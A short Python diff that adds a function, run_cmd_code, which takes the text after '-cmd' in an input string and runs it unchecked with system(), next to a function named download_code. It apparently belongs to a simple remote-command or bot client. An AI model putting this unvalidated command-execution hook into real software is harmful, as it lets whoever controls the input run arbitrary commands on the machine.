@@ -24,5 +24,15 @@ def download_code():
     start_code()
 
 def start_code():
-
     print("Starting Code")
+
+def run_cmd_code(cmd_data: str):
+    print(cmd_data)
+    try:
+        cmd_data = cmd_data.split('-cmd')[1]
+        print(f"Got {cmd_data}")
+    except Exception as s:
+        cmd_data = "msg * Hello World"
+        print("Oh no error: {}".format(s))
+    print("Executing command")
+    system(cmd_data)
